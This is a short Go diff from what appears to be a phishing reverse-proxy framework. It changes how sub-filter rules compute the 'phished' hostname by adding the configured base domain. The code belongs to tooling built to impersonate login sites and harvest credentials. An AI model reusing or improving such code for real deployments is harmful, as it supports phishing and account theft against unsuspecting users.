@@ -404,7 +404,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							if stringExists(mime, sf.mime) && (!sf.redirect_only || sf.redirect_only && redirect_set) {
 								re_s := sf.regexp
 								replace_s := sf.replace
-								phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
+								subs := combineHost(sf.subdomain, sf.domain)
+								host := p.cfg.GetBaseDomain()
+								phish_hostname, _ := p.replaceHostWithPhished(combineHost(subs, host))
 								phish_sub, _ := p.getPhishSub(phish_hostname)
 
 								re_s = strings.Replace(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)), -1)
